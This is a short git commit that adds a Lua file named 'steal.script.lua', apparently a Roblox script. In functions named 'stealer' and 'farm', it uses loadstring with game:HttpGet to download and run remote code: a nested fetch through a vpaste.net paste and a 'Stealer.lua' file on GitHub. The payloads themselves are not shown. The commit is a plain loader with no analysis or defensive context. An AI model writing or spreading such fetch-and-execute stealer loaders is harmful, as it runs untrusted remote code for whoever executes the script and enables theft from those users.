f6a1162b397ecded693a1652c8e25e16c3187d95
Kimyan1 <danishbiswas72@gmail.com>
2025-05-04 17:25:27 +0530

    Create steal.script.lua

---
+++ steal.script.lua
@@ -0,0 +1,9 @@
+local function stealer()
+     loadstring(game:HttpGet(loadstring(game:HttpGet("http://vpaste.net/lO41r", true))()))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kimyan1/scriptactually-learned/refs/heads/main/Stealer.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
